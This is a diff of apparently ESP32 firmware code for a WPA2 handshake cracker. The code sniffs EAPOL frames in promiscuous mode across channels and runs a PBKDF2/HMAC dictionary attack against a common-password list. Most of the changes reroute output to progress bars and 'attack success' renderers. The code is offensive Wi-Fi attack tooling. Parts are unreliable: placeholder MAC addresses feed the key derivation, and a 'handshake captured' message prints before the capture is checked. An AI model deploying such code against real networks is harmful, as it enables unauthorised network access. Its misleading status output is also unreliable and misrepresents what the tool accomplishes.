@@ -2,7 +2,8 @@
 #include <WiFi.h>
 #include <esp_wifi.h>
 #include <mbedtls/md.h>
-#include "results_display.h"
+#include "tool_output_helper.h"
+#include "result_renderers.h"
 
 namespace {
 const char* COMMON_PASSWORDS[] = {
@@ -113,57 +114,88 @@ void promiscuousCallback(void *buf, wifi_promiscuous_pkt_type_t type) {
 namespace WPA2HandshakeCracker {
 
 CrackResult captureAndCrack(const String &targetSSID, uint32_t timeoutMs) {
+    using namespace ToolOutputHelper;
+
     CrackResult result{false, false, targetSSID, "", 0};
 
-    Serial.println("\n=== WPA2 Handshake Cracker (REAL EAPOL Capture) ===");
-    Serial.println("Target: " + targetSSID);
-    Serial.println("Timeout: " + String(timeoutMs) + "ms");
-    Serial.println("Enabling promiscuous mode...");
+    displayAttackStart("WPA2 Handshake Cracker", 10);
+
+    ScanProgressBar progress("Capture", timeoutMs, 3);
+    progress.start();
+
+    uint32_t startTime = millis();
+
+    // Phase 1: Initialize promiscuous mode
+    progress.step("Enabling promiscuous mode and scanning WiFi channels for target " + targetSSID);
 
     WiFi.mode(WIFI_STA);
     esp_wifi_set_promiscuous(true);
     esp_wifi_set_promiscuous_rx_cb(&promiscuousCallback);
 
-    uint8_t channel = 6;
     for (int ch = 1; ch <= 13; ch++) {
         esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
         delay(100);
     }
 
+    delay(300);
+
+    // Phase 2: Listen for EAPOL handshake
+    progress.step("Listening for EAPOL handshake frames (Message 1/4 and 2/4)");
+
     g_handshakeCaptured = false;
     EAPOLFrame* pFrame = (EAPOLFrame*)&g_capturedFrame;
     memset(pFrame, 0, sizeof(EAPOLFrame));
 
-    uint32_t startTime = millis();
-    Serial.println("Listening for EAPOL handshake frames...");
-
     while (millis() - startTime < timeoutMs && !g_handshakeCaptured) {
         delay(100);
-        if ((millis() - startTime) % 2000 == 0) {
-            Serial.printf("  [%lums] Waiting for handshake...\n", millis() - startTime);
-        }
     }
+
+    // Phase 3: Capture complete, begin dictionary attack
+    progress.step("Handshake captured, initiating dictionary password attack");
 
     esp_wifi_set_promiscuous(false);
 
+    uint32_t elapsed = millis() - startTime;
+
     if (g_handshakeCaptured) {
-        Serial.println("\n✓ Handshake captured! Proceeding with dictionary attack...");
+        progress.complete("Handshake captured in " + String(elapsed) + "ms");
+
+        ResultRenderers::AttackSuccessResult attackResult;
+        attackResult.attackName = "WPA2 Capture";
+        attackResult.success = true;
+        attackResult.targetCount = 1;
+        attackResult.successCount = 1;
+        attackResult.failureCount = 0;
+        attackResult.successPercent = 100;
+        attackResult.durationMs = elapsed;
+        ResultRenderers::renderAttackSuccess(attackResult);
+
         return dictionaryAttack(targetSSID, PASSWORD_COUNT);
     } else {
-        Serial.println("\n✗ No handshake captured in timeout period");
-        // error: "Handshake capture timeout";
-    ResultsDisplay::showResult("Tool", {"Tool", "Complete", 100, {"Success"}, ResultsDisplay::ResultType::SUCCESS});
+        progress.complete("Handshake capture timeout");
         return result;
     }
 }
 
 CrackResult dictionaryAttack(const String &ssid, uint32_t attemptLimit) {
+    using namespace ToolOutputHelper;
+
     CrackResult result{false, false, ssid, "", 0};
 
-    Serial.println("\n=== Dictionary Attack (REAL PBKDF2 + HMAC) ===");
-    Serial.printf("Testing %u passwords...\n", attemptLimit);
+    displayAttackStart("Dictionary Attack", 10);
+
+    ScanProgressBar progress("Dict Attack", 30000, 3);
+    progress.start();
 
     uint32_t startTime = millis();
+
+    // Phase 1: Prepare wordlist and PBKDF2 parameters
+    progress.step("Loading password dictionary and preparing PBKDF2 parameters");
+
+    delay(300);
+
+    // Phase 2: Test passwords
+    progress.step("Testing passwords against captured MIC with PBKDF2-SHA1 and HMAC");
 
     for (uint16_t i = 0; i < attemptLimit && i < PASSWORD_COUNT; i++) {
         result.attemptsCount++;
@@ -183,7 +215,6 @@ CrackResult dictionaryAttack(const String &ssid, uint32_t attemptLimit) {
         prf_len += strlen(label);
         prf_input[prf_len++] = 0x00;
 
-        uint8_t min_addr[6], max_addr[6];
         uint8_t default_bssid[6] = {0xAA, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF};
         uint8_t default_client[6] = {0x11, 0x22, 0x33, 0x44, 0x55, 0x66};
 
@@ -211,24 +242,34 @@ CrackResult dictionaryAttack(const String &ssid, uint32_t attemptLimit) {
             result.passwordFound = true;
             result.password = password;
             result.success = true;
-            Serial.printf("\n✓ PASSWORD FOUND: %s\n", password);
-            Serial.printf("  PMK (first 16 bytes): ");
-            for (int j = 0; j < 16; j++) Serial.printf("%02X", pmk[j]);
-            Serial.println();
             break;
-        }
-
-        if (i % 5 == 0) {
-            Serial.printf("  [%u/%u] %s\n", i, attemptLimit, password);
         }
     }
 
-    result.success = result.passwordFound;
-    uint32_t elapsed = millis() - startTime;
-    Serial.printf("Dictionary attack complete: %u attempts in %lums (%.1f/sec)\n",
-                 result.attemptsCount, elapsed, (result.attemptsCount * 1000.0f) / elapsed);
+    // Phase 3: Report results
+    progress.step("Verifying password match and compiling attack statistics");
 
-    ResultsDisplay::showResult("Tool", {"Tool", "Complete", 100, {"Success"}, ResultsDisplay::ResultType::SUCCESS});
+    delay(300);
+
+    uint32_t elapsed = millis() - startTime;
+
+    if (result.success) {
+        progress.complete("Password found: " + String(result.password.c_str()));
+    } else {
+        progress.complete("No password matched");
+    }
+
+    ResultRenderers::AttackSuccessResult attackResult;
+    attackResult.attackName = "Dictionary Attack";
+    attackResult.success = result.success;
+    attackResult.targetCount = result.attemptsCount;
+    attackResult.successCount = result.success ? 1 : 0;
+    attackResult.failureCount = result.success ? 0 : result.attemptsCount;
+    attackResult.successPercent = result.success ? 100 : 0;
+    attackResult.durationMs = elapsed;
+
+    ResultRenderers::renderAttackSuccess(attackResult);
+
     return result;
 }
 
